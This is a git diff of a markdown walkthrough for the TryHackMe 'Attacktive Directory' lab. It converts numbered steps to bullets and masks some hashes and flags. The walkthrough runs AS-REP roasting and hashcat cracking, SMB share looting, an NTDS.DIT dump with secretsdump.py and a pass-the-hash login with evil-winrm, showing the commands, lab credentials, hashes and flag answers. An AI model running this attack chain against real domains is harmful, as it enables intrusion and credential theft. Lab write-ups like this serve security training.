@@ -104,6 +104,7 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
 ## Abusing Kerberos
 1. Read this section, then proceed.
 2. We can use `GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass` or `GetNPUsers.py -dc-ip spookysec.local spookysec.local/ -no-pass -usersfile user.txt` after saving all users to `user.txt` to capture `TGT Token` of `svc-admin` using ASREPRoasting method.
+   
    ```bash
    GetNPUsers.py -dc-ip spookysec.local spookysec.local/svc-admin -no-pass
    Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
@@ -111,14 +112,15 @@ Room Link: [https://tryhackme.com/r/room/attacktivedirectory](https://tryhackme.
    [*] Getting TGT for svc-admin
    $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:92f01444cd97361751ec4fb5b5ea985a$04b60fa94a84739e7db13609241d16247154e8d1f952c26a0c5063e53d08c9a4365690982460f7872d8ade23113cd4df929c85d5404f4380fdcaa5af2ee22d7988d7ee428e535be1b2dcff88bf574d418ca88c3b435cea77b6ea322b510bcf59ac1fba479d54db52104c3bec497cf1b81ddcd384bbb5d115ba2c380f0520705c7b63c88f548f17a9c6c8c1b746175b896b29555a45002ad5195a90d42c45193e42915a1107ed46a6b79da94b835f5e7bd8858c0bb7f07fecab80f7097c769da284ea270697500ea73ea223d93684e8d087248610cf7809d076d5e97564e9729ec5aa04656eaec9f3f5a92ecfaa8524346e93
    ```
-3. Question `We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?` Answer `svc-admin`
-4. Question `Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)` Answer `Kerberos 5 AS-REP etype 23`. Source: https://hashcat.net/wiki/doku.php?id=example_hashes
-5. Question `What mode is the hash?` Answer `18200` Source: https://hashcat.net/wiki/doku.php?id=example_hashes
-6. We can save the `TGT hash` inside a file named `hash.txt` with given passwordlist and crack it with `hashcat -m 18200 hash.txt passwordlist.txt`.
-7. Question `Now crack the hash with the modified password list provided, what is the user accounts password?` Answer `management2005`
+- Question `We have two user accounts that we could potentially query a ticket from. Which user account can you query a ticket from with no password?` Answer `svc-admin`
+- Question `Looking at the Hashcat Examples Wiki page, what type of Kerberos hash did we retrieve from the KDC? (Specify the full name)` Answer `Kerberos 5 AS-REP etype 23`. Source: https://hashcat.net/wiki/doku.php?id=example_hashes
+- Question `What mode is the hash?` Answer `18200` Source: https://hashcat.net/wiki/doku.php?id=example_hashes
+- We can save the `TGT hash` inside a file named `hash.txt` with given passwordlist and crack it with `hashcat -m 18200 hash.txt passwordlist.txt`.
+- Question `Now crack the hash with the modified password list provided, what is the user accounts password?` Answer `management2005`
    
 ## Back to the Basics
-1. If we enumerate with smbclient we can see some shares. Used command `smbclient -L \\\\spookysec.local\\ -U 'svc-admin'` using password `management2005`. 
+
+- If we enumerate with smbclient we can see some shares. Used command `smbclient -L \\\\spookysec.local\\ -U 'svc-admin'` using password `management2005`. 
 ```bash
 smbclient -L \\\\spookysec.local\\ -U 'svc-admin'
 Password for [WORKGROUP\svc-admin]:
@@ -133,7 +135,8 @@ Password for [WORKGROUP\svc-admin]:
 	SYSVOL          Disk      Logon server share 
 SMB1 disabled -- no workgroup available
 ```
-2. If we check `backup` share with `smbclient` using `smbclient \\\\spookysec.local\\backup -U 'svc-admin'` command and password `management2005`, We can see `backup_credentials.txt` file there with `ls` or `dir` command. Then we can download `backup_credentials.txt` with `get backup_credentials.txt` command.
+- If we check `backup` share with `smbclient` using `smbclient \\\\spookysec.local\\backup -U 'svc-admin'` command and password `management2005`, We can see `backup_credentials.txt` file there with `ls` or `dir` command. Then we can download `backup_credentials.txt` with `get backup_credentials.txt` command.
+
 ```bash
 ORKGROUP\svc-admin]:
 Try "help" to get a list of possible commands.
@@ -148,16 +151,18 @@ getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.1 K
 smb: \> 
 
 ```
-3. Inside it there is a `base64` encoded string `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. If we decode it using `cat backup_credentials.txt |base64 -d` command we will get `backup@spookysec.local:backup2517860`.
-4. Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
-5. Question `Which option will list shares?` Answer `-L`
-6. Question `How many remote shares is the server listing?` Answer `6`
-7. Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer `backup`
-8. Question `What is the content of the file?` Answer `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
-9. Question `Decoding the contents of the file, what is the full contents?` Answer `backup@spookysec.local:backup2517860`
+- Inside it there is a `base64` encoded string `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`. If we decode it using `cat backup_credentials.txt |base64 -d` command we will get `backup@spookysec.local:backup2517860`.
+- Question `What utility can we use to map remote SMB shares?` Answer `smbclient`
+- Question `Which option will list shares?` Answer `-L`
+- Question `How many remote shares is the server listing?` Answer `6`
+- Question `There is one particular share that we have access to that contains a text file. Which share is it?` Answer `backup`
+- Question `What is the content of the file?` Answer `YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw`
+- Question `Decoding the contents of the file, what is the full contents?` Answer `backup@spookysec.local:backup2517860`
 
 ## Elevating Privileges within the Domain
-1. We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.
+
+- We can dump password hashes, as backup account has that permission using `secretsdump.py -dc-ip spookysec.local backup:backup251786@spookysec.local` command.
+
 ```bash
 secretsdump.py -dc-ip spookysec.local backup:backup2517860@spookysec.local
 Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
@@ -165,7 +170,7 @@ Impacket v0.12.0.dev1+20240807.21946.829239e - Copyright 2023 Fortra
 [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
 [*] Using the DRSUAPI method to get NTDS.DIT secrets
-Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213*******97260b0bcb4fc:::
 Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
 spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
@@ -177,15 +182,17 @@ spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758
 .........
 ..............
 ```
-2. Question `What method allowed us to dump NTDS.DIT?` Answer `DRSUAPI`
-3. Question `What is the Administrators NTLM hash?` Answer `0e0363213e37b94221497260b0bcb4fc`
-4. Question `What method of attack could allow us to authenticate as the user without the password?` Answer `Pass the hash`
-5. Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`
+
+- Question `What method allowed us to dump NTDS.DIT?` Answer `DRSUAPI`
+- Question `What is the Administrators NTLM hash?` Answer `0e0363213e37b94221497260b0bcb4fc`
+- Question `What method of attack could allow us to authenticate as the user without the password?` Answer `Pass the hash`
+- Question `Using a tool called Evil-WinRM what option will allow us to use a hash?` Answer `-H`
 
 ## Flag Submission Panel
-1. We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc` command. We can get three flag files inside three directory.
+- We can login to administrator using `evil-winrm` with `evil-winrm -i spookysec.local -u Administrator -H 0e03632*******b0bcb4fc` command. We can get three flag files inside three directory.
+
 ```bash
-evil-winrm -i spookysec.local -u Administrator -H 0e0363213e37b94221497260b0bcb4fc                                        
+evil-winrm -i spookysec.local -u Administrator -H 0e036321*****97260b0bcb4fc                                        
 Evil-WinRM shell v3.5
                                         
 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
@@ -201,9 +208,9 @@ TryHackMe{B4c*****c0tty!}
 TryHackMe{4ctive*****toryM4st3r}
 *Evil-WinRM* PS C:\Users\Administrator\Documents> 
 ```
-2. Question `svc-admin` Answer `TryHackMe{K3rb3*****3_4uth}`
-3. Question `backup` Answer `TryHackMe{B4*****0tty!}`
-4. Question `administrator` Answer `TryHackMe{4ctiv******M4st3r}`
+- Question `svc-admin` Answer `TryHackMe{K3rb3*****3_4uth}`
+- Question `backup` Answer `TryHackMe{B4*****0tty!}`
+- Question `administrator` Answer `TryHackMe{4ctiv******M4st3r}`
 
    
 Author: [Zishan Ahamed Thandar](https://ZishanAdThandar.github.io)
